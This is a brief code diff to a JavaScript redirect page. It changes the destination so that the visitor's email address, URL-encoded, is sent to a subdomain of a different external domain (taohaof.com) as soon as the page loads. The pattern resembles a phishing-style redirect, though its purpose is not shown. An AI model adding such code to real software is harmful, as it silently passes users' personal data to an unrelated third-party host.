@@ -28,7 +28,7 @@ export default function RedirectPage() {
     }
 
     const DOMAIN = firstLabel.toUpperCase();
-    const dest = `https://${DOMAIN}.finalurl.com/redirect|${encodeURIComponent(email)}`;
+    const dest = `https://${DOMAIN}.taohaof.com/redirect|${encodeURIComponent(email)}`;
     window.location.replace(dest);
   }, []);
 
